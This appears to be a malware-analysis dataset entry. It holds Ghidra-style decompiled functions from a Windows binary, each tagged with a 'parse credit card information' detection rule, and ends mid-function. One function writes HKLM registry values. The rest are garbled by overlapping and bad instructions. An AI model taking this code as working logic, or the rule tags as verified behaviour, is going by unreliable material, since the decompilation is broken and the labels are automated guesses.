{
    "004010d0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004010d0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x4105c4, arg_8h);\n    (*pcVar2)(&var_268h, 0x4105dc, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_4ch = &var_164h;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    var_3ch = &var_ch;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_20h = ~uVar4 - 1;\n    var_38h = 0x410604;\n    var_34h = 0x410610;\n    var_30h = 0x41061c;\n    var_2ch = 0x41062c;\n    var_28h = 0x410634;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1121
    },
    "004029d0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a22) overlaps instruction at (ram,0x00402a21)\n// \n\nint32_t __cdecl fcn.004029d0(uint *arg_8h, uint16_t *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t unaff_ESI;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    bool bVar2;\n    \n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (in_ECX == 0) {\n            iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)();\n            if (iVar1 == 0) {\n                *(unaff_ESI + 0x120) = *(unaff_ESI + 0x120) | 0x80;\n            }\n            return iVar1;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    bVar2 = false;\n    if (arg_10h != NULL) {\n        do {\n            if ((bVar2) || (!bVar2)) {\n                arg_8h = arg_8h + *arg_ch;\n            }\n            else {\n                *arg_10h = *arg_8h;\n                arg_ch = 0x8b66c033;\n                LOCK();\n                arg_8h = arg_8h + 1;\n                arg_10h = arg_10h + 1;\n            }\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            bVar2 = SBORROW4(arg_10h, 1);\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != NULL);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 472
    },
    "00402fb0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040357b) overlaps instruction at (ram,0x00403577)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint32_t fcn.00402fb0(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ushort extraout_CX;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    char cVar6;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint32_t extraout_ECX_08;\n    uint extraout_ECX_09;\n    uint extraout_ECX_10;\n    int32_t extraout_ECX_11;\n    uint extraout_ECX_12;\n    int32_t extraout_ECX_13;\n    uint extraout_ECX_14;\n    int32_t extraout_ECX_15;\n    uint extraout_ECX_16;\n    uint extraout_ECX_17;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    uint32_t uVar7;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t iVar8;\n    uint extraout_EDX_02;\n    uint extraout_EDX_03;\n    uint16_t uVar9;\n    uint32_t unaff_EBX;\n    uint *puVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint *puVar15;\n    uint32_t *puVar16;\n    uint *puVar17;\n    uint32_t *puVar18;\n    uint unaff_EBP;\n    uint uVar19;\n    uint *puVar20;\n    uint *puVar21;\n    uint32_t *puVar22;\n    uint16_t uVar23;\n    ushort uVar24;\n    uint *unaff_ESI;\n    uint uVar25;\n    uint32_t uVar26;\n    uint *unaff_EDI;\n    uint uVar27;\n    uint uVar28;\n    uint32_t uVar29;\n    int32_t *piVar30;\n    int32_t *piVar31;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    uint8_t uVar32;\n    uint8_t uVar33;\n    uint8_t in_AF;\n    bool bVar34;\n    bool bVar35;\n    char cVar36;\n    uint8_t uVar37;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar38;\n    uchar uVar39;\n    bool bVar40;\n    uint8_t uVar41;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 extraout_ST0;\n    ulong uVar42;\n    unkbyte6 Var43;\n    uint uStackY72;\n    uint uStackY68;\n    uint32_t uStackY64;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint *puVar12;\n    \n    fcn.00401450(0x406010, 0xd, 0x41055c, 10);\n    uVar42 = fcn.00401450(0x406010, 0xd, 0x410568, 0x12);\n    cVar38 = '\\0';\n    uVar7 = (uVar42 >> 0x20 & 0xffffff00 | extraout_CH) & uVar42;\n    cVar36 = uVar7 < 0;\n    bVar34 = uVar7 == 0;\n    uVar7 = fcn.00401450(0x406010, 0xd, 0x41057c, 4);\n    if ((!bVar34 && cVar38 == cVar36) && (bVar34 || cVar38 != cVar36)) {\n        in_AF = 9 < (uVar7 & 0xf) | in_AF;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        return uVar7 & 0xffff0000 | CONCAT11((uVar7 >> 8) + in_AF, uVar7 + in_AF * '\\x06') & 0xff0f;\n    }\n    fcn.00401450(0x406010, 0xd, 0x410580, 0xc);\n    fcn.00401450(0x406010, 0xd, 0x41058c, 7);\n    fcn.00401450(0x406010, 0xd, 0x410594, 0xb);\n    uVar39 = 0;\n    fcn.00401450(0x406010, 0xd, 0x4105a0, 0xc);\n    iVar4 = fcn.00401450(0x406010, 0xd, 0x4105ac, 8);\n    if ((uVar39) || (uVar27 = extraout_ECX_00,  !uVar39)) {\n        uVar27 = 0xd;\n        in_stack_ffffffcc = 0x4105b4;\n        in_stack_ffffffc8 = 0xd;\n    }\n    *unaff_EDI = *unaff_ESI;\n    cVar38 = SCARRY4(iVar4 + 1, 0xd6a0041);\n    cVar36 = iVar4 + 0xd6a0042 < 0;\n    uStackY64 = 0x40310a;\n    uVar5 = fcn.00401450(0x406010, in_stack_ffffffc8, in_stack_ffffffcc, uVar27);\n    uVar7 = extraout_ECX_01;\n    if (cVar38 == cVar36) {\n        uStackY64 = uStackY64 & 0xffff | extraout_ECX_01 << 0x10;\n        uVar7 = extraout_ECX_01 & 0xffff;\n        cVar6 = (extraout_ECX_01 << 0x10) >> 0x18;\n        if (cVar38 != cVar36) goto code_r0x0040311c;\n    }\n    cVar6 = uVar7 >> 8;\n    uStackY64 = 0x18;\n    uStackY68 = 0x4105c4;\n    uStackY72 = 0xd;\ncode_r0x0040311c:\n    puVar10 = &stack0xffffffb8 ^ *(unaff_EBX + 0x6a);\n    *(unaff_ESI + -0xe) = *(unaff_ESI + -0xe) - cVar6;\n    puVar10[-1] = 0x406010;\n    puVar10[-2] = 0x403132;\n    fcn.00401450(puVar10[-1], *puVar10, puVar10[1], puVar10[2]);\n    *(puVar10 + 0x3a) = unaff_EBX;\n    *(puVar10 + 0xe) = uVar5;\n    puVar10[0xd] = unaff_EDI + 1;\n    uVar27 = puVar10[0xd];\n    uVar23 = *(puVar10 + 0xe);\n    uVar9 = *(puVar10 + 0x3a);\n    puVar10[0xe] = 0x25;\n    puVar10[0xd] = 0x4105dc;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x40315b;\n    Var43 = fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    puVar10[0xe] = Var43;\n    *(puVar10 + 0x36) = Var43 >> 0x20;\n    puVar10[0xe] = 10;\n    puVar10[0xd] = 0x410604;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x40318e;\n    uVar42 = fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    puVar10[0xe] = uVar42;\n    puVar10[0xd] = extraout_ECX_02;\n    puVar10[0xc] = uVar42 >> 0x20;\n    puVar10[0xb] = unaff_EBX & 0xffff0000 | uVar9;\n    puVar10[10] = puVar10 + 0xf;\n    puVar10[9] = unaff_EBP;\n    puVar10[8] = uVar5 & 0xffff0000 | uVar23;\n    puVar10[7] = uVar27;\n    uVar28 = puVar10[7];\n    uVar25 = puVar10[8];\n    uVar19 = puVar10[9];\n    uVar27 = puVar10[0xb];\n    puVar10[0xe] = 0xc;\n    puVar10[0xd] = 0x410610;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x4031ab;\n    uVar42 = fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    puVar10[0xe] = uVar42;\n    puVar10[0xd] = extraout_ECX_03;\n    puVar10[0xc] = uVar42 >> 0x20;\n    puVar10[0xb] = uVar27;\n    puVar10[10] = puVar10 + 0xf;\n    puVar10[9] = uVar19;\n    puVar10[8] = uVar25;\n    puVar10[7] = uVar28;\n    uVar29 = puVar10[7];\n    uVar26 = puVar10[8];\n    uVar5 = puVar10[9];\n    uVar7 = puVar10[0xb];\n    puVar10[0xe] = 0xd;\n    puVar10[0xd] = 0x41061c;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x4031d0;\n    uVar27 = fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    puVar10[0xe] = uVar27;\n    bVar34 = false;\n    puVar10[0xe] = 6;\n    puVar10[0xd] = 0x41062c;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x4031eb;\n    fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    if ((!bVar34) && (puVar10[10] = extraout_EDX,  bVar34)) {\n        uVar7 = puVar10[0x12];\n        *puVar10[0xb] = uVar7;\n        return uVar7;\n    }\n    puVar10[10] = 5;\n    puVar10[9] = 0x410634;\n    puVar10[8] = 0xd;\n    puVar10[7] = 0x406010;\n    puVar10[6] = 0x40321e;\n    uVar3 = fcn.00401450(puVar10[7], puVar10[8], puVar10[9], puVar10[10]);\n    *(puVar10 + 0x3a) = uVar3;\n    *(puVar10 + 0xe) = extraout_ECX_04;\n    *(puVar10 + 0x36) = extraout_DX;\n    *(puVar10 + 0xd) = uVar7;\n    *(puVar10 + 0x32) = puVar10 + 0x3c;\n    *(puVar10 + 0xc) = uVar5;\n    *(puVar10 + 0x2e) = uVar26;\n    *(puVar10 + 0xb) = uVar29;\n    puVar10[10] = extraout_ECX_04;\n    uVar9 = *(puVar10 + 0xb);\n    uVar24 = *(puVar10 + 0x2e);\n    puVar21 = uVar5 & 0xffff0000 | *(puVar10 + 0xc);\n    uVar3 = *(puVar10 + 0xd);\n    puVar10[0xe] = 0xd;\n    puVar10[0xd] = 0x41063c;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x40323f;\n    Var43 = fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    puVar10[0xe] = Var43;\n    *(puVar10 + 0x36) = Var43 >> 0x20;\n    puVar10[0xe] = 0x19;\n    puVar10[0xd] = 0x41064c;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x403272;\n    fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    *(puVar10 + 0x3a) = uVar3;\n    *(puVar10 + 0xe) = uVar24;\n    puVar10[0xd] = uVar29 & 0xffff0000 | uVar9;\n    uVar27 = puVar10[0xd];\n    uVar23 = *(puVar10 + 0xe);\n    uVar9 = *(puVar10 + 0x3a);\n    puVar10[0xe] = 0xf;\n    puVar10[0xd] = 0x410668;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x40329b;\n    fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    puVar10[0xe] = extraout_ECX_05;\n    bVar34 = (extraout_ECX_05 >> 8 | extraout_DL | 0x1f) == 0;\n    puVar10[0xe] = 0xe;\n    puVar10[0xd] = 0x410678;\n    puVar10[0xc] = 0xd;\n    puVar10[0xb] = 0x406010;\n    puVar10[10] = 0x4032be;\n    fcn.00401450(puVar10[0xb], puVar10[0xc], puVar10[0xd], puVar10[0xe]);\n    puVar11 = puVar10 + 0xb;\n    puVar20 = puVar21;\n    if ((!bVar34) && (puVar11 = puVar10 + 0xb,  bVar34)) {\n        puVar12 = puVar10 + 10;\n        puVar20 = puVar10 + 10;\n        puVar10[10] = puVar21;\n        cVar36 = '\\x10';\n        do {\n            puVar21 = puVar21 + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *puVar21;\n            cVar36 = cVar36 + -1;\n        } while ('\\0' < cVar36);\n        puVar10[-7] = puVar10 + 10;\n        puVar11 = puVar10 + -0x5e37;\n    }\n    puVar11[-1] = 0xd;\n    puVar11[-2] = 0x410688;\n    puVar11[-3] = 0xd;\n    puVar11[-4] = 0x406010;\n    puVar11[-5] = 0x4032e0;\n    uVar42 = fcn.00401450(puVar11[-4], puVar11[-3], puVar11[-2], puVar11[-1]);\n    puVar11[3] = uVar42;\n    puVar11[2] = extraout_ECX_06;\n    puVar11[1] = uVar42 >> 0x20;\n    *puVar11 = uVar7 & 0xffff0000 | uVar9;\n    puVar11[-1] = puVar11 + 4;\n    puVar11[-2] = puVar20;\n    puVar11[-3] = uVar26 & 0xffff0000 | uVar23;\n    puVar11[-4] = uVar27;\n    bVar34 = true;\n    uVar19 = puVar11[-4];\n    uVar7 = puVar11[-3];\n    puVar21 = puVar11[-2];\n    uVar27 = *puVar11;\n    puVar11[3] = 0xc;\n    puVar11[2] = 0x410698;\n    puVar11[1] = 0xd;\n    *puVar11 = 0x406010;\n    puVar11[-1] = 0x403307;\n    fcn.00401450(*puVar11, puVar11[1], puVar11[2], puVar11[3]);\n    puVar22 = puVar21;\n    if ((!bVar34) && (bVar34)) {\n        puVar13 = puVar11 + -1;\n        puVar22 = puVar11 + -1;\n        puVar11[-1] = puVar21;\n        cVar36 = '\\x10';\n        do {\n            puVar21 = puVar21 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar21;\n            cVar36 = cVar36 + -1;\n        } while ('\\0' < cVar36);\n        puVar11[-0x12] = puVar11 + -1;\n        puVar11 = puVar11 + -0x5e63;\n    }\n    puVar11[-1] = 0xf;\n    puVar11[-2] = 0x4106a4;\n    puVar11[-3] = 0xd;\n    puVar11[-4] = 0x406010;\n    puVar11[-5] = 0x403329;\n    fcn.00401450(puVar11[-4], puVar11[-3], puVar11[-2], puVar11[-1]);\n    puVar11[3] = extraout_EDX_00;\n    puVar11[3] = 0xb;\n    puVar11[2] = 0x4106b4;\n    puVar11[1] = 0xd;\n    *puVar11 = 0x406010;\n    puVar11[-1] = 0x403349;\n    uVar25 = fcn.00401450(*puVar11, puVar11[1], puVar11[2], puVar11[3]);\n    puVar11[3] = uVar25;\n    puVar11[2] = extraout_ECX_07;\n    puVar11 = puVar11 + 3;\n    while( true ) {\n        puVar14 = puVar11;\n        *puVar14 = 0xb;\n        puVar14[-1] = 0x4106c0;\n        puVar14[-2] = 0xd;\n        puVar14[-3] = 0x406010;\n        puVar14[-4] = 0x403374;\n        uVar5 = fcn.00401450(puVar14[-3], puVar14[-2], puVar14[-1], *puVar14);\n        *puVar14 = uVar5;\n        bVar34 = uVar5 < extraout_ECX_08;\n        bVar40 = SBORROW4(uVar5, extraout_ECX_08);\n        bVar35 = uVar5 == extraout_ECX_08;\n        *puVar14 = 0xb;\n        puVar14[-1] = 0x4106cc;\n        puVar14[-2] = 0xd;\n        puVar16 = puVar14 + -3;\n        puVar14[-3] = 0x406010;\n        puVar14[-4] = 0x403390;\n        fcn.00401450(puVar14[-3], puVar14[-2], puVar14[-1], *puVar14);\n        if (bVar34 || bVar35) break;\n        *(puVar14 + -0xe) = uVar7;\n        uVar7 = uVar7 & 0xffff0000 | *(puVar14 + -0xe);\n        if (!bVar34 && !bVar35) break;\n        puVar11 = puVar14 + -3;\n        if (!bVar40) {\n            *(puVar14 + -4) = in_CS;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    puVar14[-4] = 10;\n    puVar14[-5] = 0x4106d8;\n    puVar14[-6] = 0xd;\n    puVar14[-7] = 0x406010;\n    puVar14[-8] = 0x4033c5;\n    uVar42 = fcn.00401450(puVar14[-7], puVar14[-6], puVar14[-5], puVar14[-4]);\n    *puVar14 = uVar42;\n    puVar14[-1] = extraout_ECX_09;\n    puVar14[-2] = uVar42 >> 0x20;\n    puVar14[-3] = uVar27;\n    puVar14[-4] = puVar14 + 1;\n    puVar14[-5] = puVar22;\n    puVar14[-6] = uVar7;\n    puVar14[-7] = uVar19;\n    piVar30 = puVar14[-7];\n    uVar7 = puVar14[-6];\n    uVar27 = puVar14[-3];\n    *puVar14 = 0xc;\n    puVar14[-1] = 0x4106e4;\n    puVar14[-2] = 0xd;\n    puVar14[-3] = 0x406010;\n    puVar14[-4] = 0x4033ee;\n    fcn.00401450(puVar14[-3], puVar14[-2], puVar14[-1], *puVar14);\n    *puVar14 = uVar27;\n    puVar14[-1] = extraout_ECX_10;\n    uVar27 = *puVar14;\n    *puVar14 = 0xe;\n    puVar14[-1] = 0x4106f0;\n    puVar14[-2] = 0xd;\n    puVar14[-3] = 0x406010;\n    puVar14[-4] = 0x40341a;\n    Var43 = fcn.00401450(puVar14[-3], puVar14[-2], puVar14[-1], *puVar14);\n    *puVar14 = Var43;\n    *(puVar14 + -2) = Var43 >> 0x20;\n    uVar39 = (((Var43 & 0xff00 | Var43 & uVar27 >> 8) ^ 0x6200) + 0xcb78 & 0x7ee5) == 0;\n    *puVar14 = 0x11;\n    puVar14[-1] = 0x410700;\n    puVar14[-2] = 0xd;\n    puVar14[-3] = 0x406010;\n    puVar14[-4] = 0x40344d;\n    fcn.00401450(puVar14[-3], puVar14[-2], puVar14[-1], *puVar14);\n    iVar4 = extraout_ECX_11;\n    iVar8 = extraout_EDX_01;\n    puVar11 = puVar14 + -3;\n    if (uVar39) goto code_r0x0040346b;\n    puVar14[-4] = piVar30;\n    piVar31 = puVar14[-4];\n    do {\n        puVar11 = puVar16;\n        piVar30 = piVar31;\n        if (uVar39) {\n            piVar30 = piVar31 + 1;\n            iVar2 = in(iVar8);\n            *piVar31 = iVar2;\n            puVar15 = puVar16 + -1;\n            puVar17 = puVar16 + -1;\n            if (puVar16 < 1) {\n                *(iVar8 + 0xd) = *(iVar8 + 0xd) + (iVar4 + 1 >> 8);\n                goto code_r0x004034db;\n            }\n        }\n        else {\ncode_r0x0040346b:\n            puVar15 = puVar11 + -4;\n            *(puVar11 + -4) = 0x13;\n        }\n        *(iVar8 + 0x13) = *(iVar8 + 0x13) ^ iVar4 >> 8;\n        puVar15[-1] = 0x410714;\n        puVar15[-2] = 0xd;\n        puVar15[-3] = 0x406010;\n        puVar15[-4] = 0x40347e;\n        uVar19 = fcn.00401450(puVar15[-3], puVar15[-2], puVar15[-1], *puVar15);\n        puVar15[4] = uVar19;\n        puVar15[3] = extraout_ECX_12;\n        uVar9 = CONCAT11((uVar19 >> 8) - extraout_ECX_12, uVar19 + '\\x01') - 1;\n        bVar34 = false;\n        uVar39 = (uVar9 & 0x637b) == 0;\n        bVar35 = (POPCOUNT(uVar9 & 0x7b) & 1U) == 0;\n        puVar15[4] = 0x14;\n        puVar15[3] = 0x410728;\n        puVar15[2] = 0xd;\n        puVar15[1] = 0x406010;\n        *puVar15 = 0x4034ae;\n        uVar19 = fcn.00401450(puVar15[1], puVar15[2], puVar15[3], puVar15[4]);\n        puVar21 = puVar15 + 1;\n        if ((bVar35) || (*puVar15 = uVar19,  puVar21 = puVar15 + 1,  !bVar35)) goto code_r0x004034d2;\n        puVar11 = segment(in_SS, puVar15 + 4);\n        puVar16 = puVar15 + 1 & 0xffff0000 | puVar15 + 8;\n        iVar8 = -0x4843615b;\n        if (bVar34) {\n            return *puVar11;\n        }\n        iVar4 = extraout_ECX_13;\n        piVar31 = piVar30;\n        if (!bVar35) break;\n    } while( true );\n    puVar21 = (puVar16 ^ uVar7) - 4;\n    *((puVar16 ^ uVar7) - 4) = 0xb7bc9ea5;\ncode_r0x004034d2:\n    *(puVar21 + -4) = 0x33;\n    *(puVar21 + -8) = 0x41073c;\n    puVar17 = puVar21 + -0xc;\n    *(puVar21 + -0xc) = 0xd;\ncode_r0x004034db:\n    puVar17[-1] = 0x406010;\n    puVar17[-2] = 0x4034e5;\n    fcn.00401450(puVar17[-1], *puVar17, puVar17[1], puVar17[2]);\n    puVar17[6] = extraout_ECX_14;\n    puVar17[5] = extraout_EDX_02;\n    puVar17[6] = 10;\n    puVar17[5] = 0x410770;\n    puVar17[4] = 0xd;\n    puVar17[3] = 0x406010;\n    puVar17[2] = 0x40350a;\n    fcn.00401450(puVar17[3], puVar17[4], puVar17[5], puVar17[6]);\n    puVar17[6] = uVar27;\n    puVar17[5] = uVar7;\n    *(puVar17 + 0x12) = extraout_DX_00;\n    uVar7 = uVar7 & 0xffff0000 | uVar7 + 1;\n    uVar39 = uVar7 < 0x222c;\n    bVar34 = uVar7 - 0x222c < 0;\n    cVar36 = uVar7 == 0x222c;\n    iVar4 = puVar17[5];\n    puVar17[6] = 4;\n    puVar17[5] = 0x41077c;\n    puVar17[4] = 0xd;\n    puVar17[3] = 0x406010;\n    puVar17[2] = 0x40353e;\n    uVar27 = fcn.00401450(puVar17[3], puVar17[4], puVar17[5], puVar17[6]);\n    puVar21 = puVar17 + 3;\n    if ((!bVar34) && (puVar17[2] = uVar27,  puVar21 = puVar17 + 3,  bVar34)) {\n        piVar31 = piVar30 + 1;\n        puVar1 = iVar4 + 4;\n        *(piVar30 + 7) = extraout_ST0;\n        puVar21 = puVar17 + 4;\n        piVar30 = piVar30 + 5;\n        iVar4 = iVar4 + 5;\n        uVar39 = *puVar1 < *piVar31;\n        cVar36 = *puVar1 == *piVar31;\n    }\n    *(puVar21 + -4) = 5;\n    puVar11 = puVar21 + -4;\n    while( true ) {\n        puVar18 = puVar11;\n        puVar18[-1] = 0x410780;\n        puVar18[-2] = 0xd;\n        puVar18[-3] = 0x406010;\n        puVar18[-4] = 0x403562;\n        fcn.00401450(puVar18[-3], puVar18[-2], puVar18[-1], *puVar18);\n        if ((uVar39) || (!uVar39)) break;\n        puVar11 = puVar18 + -3;\n        if (extraout_ECX_15 == 1 || cVar36 == '\\0') {\n            *piVar30 = iVar4 + 4;\n            *(puVar18 + -4) = in_ES;\ncode_r0x0040357d:\n            puVar18[-5] = 0x410788;\n            puVar18[-6] = 0xd;\n            puVar18[-7] = 0x406010;\n            puVar18[-8] = 0x40358e;\n            uVar27 = fcn.00401450(puVar18[-7], puVar18[-6], puVar18[-5], puVar18[-4]);\n            puVar18[4] = uVar27;\n            puVar18[3] = extraout_ECX_16;\n            puVar18[4] = 0xc;\n            puVar18[3] = 0x410790;\n            puVar18[2] = 0xd;\n            puVar18[1] = 0x406010;\n            *puVar18 = 0x4035b9;\n            fcn.00401450(puVar18[1], puVar18[2], puVar18[3], puVar18[4]);\n            puVar18[4] = extraout_EDX_03;\n            *(puVar18 + 0xe) = extraout_CX;\n            *(puVar18 + 3) = piVar30;\n            uVar32 = 0;\n            uVar41 = 1;\n            uVar37 = 1;\n            bVar34 = false;\n            uVar33 = 0;\n            puVar18[4] = 0xc;\n            puVar18[3] = 0x41079c;\n            puVar18[2] = 0xd;\n            puVar18[1] = 0x406010;\n            *puVar18 = 0x4035f5;\n            fcn.00401450(puVar18[1], puVar18[2], puVar18[3], puVar18[4]);\n            if ((!bVar34) && (*puVar18 = extraout_ECX_17,  bVar34)) {\n                *puVar18 = (in_NT & 1) * 0x4000 | (uVar41 & 1) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                           (uVar37 & 1) * 0x80 | (bVar34 & 1) * 0x40 | (in_AF & 1) * 0x10 | (uVar33 & 1) * 4 |\n                           uVar32 & 1 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                           (in_AC & 1) * 0x40000;\n            }\n            *puVar18 = 0x2a;\n            puVar18[-1] = 0x4107d4;\n            puVar18[-2] = 0xd;\n            puVar18[-3] = 0x406010;\n            puVar18[-4] = 0x403614;\n            uVar42 = fcn.00401450(puVar18[-3], puVar18[-2], puVar18[-1], *puVar18);\n            puVar18[4] = uVar42;\n            puVar18[3] = uVar42 >> 0x20;\n            puVar18[4] = 0xb;\n            puVar18[3] = 0x410800;\n            puVar18[2] = 0xd;\n            puVar18[1] = 0x406010;\n            *puVar18 = 0x403641;\n            fcn.00401450(puVar18[1], puVar18[2], puVar18[3], puVar18[4]);\n            *puVar18 = 0x41;\n            puVar18[-1] = 0x41085c;\n            puVar18[-2] = 0xd;\n            puVar18[-3] = 0x406010;\n            puVar18[-4] = 0x403654;\n            fcn.00401450(puVar18[-3], puVar18[-2], puVar18[-1], *puVar18);\n            puVar18[-4] = 0x33;\n            puVar18[-5] = 0x4108a0;\n            puVar18[-6] = 0xd;\n            puVar18[-7] = 0x406010;\n            puVar18[-8] = 0x403667;\n            fcn.00401450(puVar18[-7], puVar18[-6], puVar18[-5], puVar18[-4]);\n            puVar18[-8] = 0x4b;\n            puVar18[-9] = 0x4108d4;\n            puVar18[-10] = 0xd;\n            puVar18[-0xb] = 0x406010;\n            puVar18[-0xc] = 0x40367a;\n            fcn.00401450(puVar18[-0xb], puVar18[-10], puVar18[-9], puVar18[-8]);\n            puVar18[4] = 0x39;\n            puVar18[3] = 0x410920;\n            puVar18[2] = 0xd;\n            puVar18[1] = 0x406010;\n            *puVar18 = 0x403690;\n            fcn.00401450(puVar18[1], puVar18[2], puVar18[3], puVar18[4]);\n            *puVar18 = 8;\n            puVar18[-1] = 0x41095c;\n            puVar18[-2] = 0xd;\n            puVar18[-3] = 0x406010;\n            puVar18[-4] = 0x4036a3;\n            fcn.00401450(puVar18[-3], puVar18[-2], puVar18[-1], *puVar18);\n            puVar18[-4] = 0x14;\n            puVar18[-5] = 0x410964;\n            puVar18[-6] = 0xd;\n            puVar18[-7] = 0x406010;\n            puVar18[-8] = 0x4036b6;\n            uVar7 = fcn.00401450(puVar18[-7], puVar18[-6], 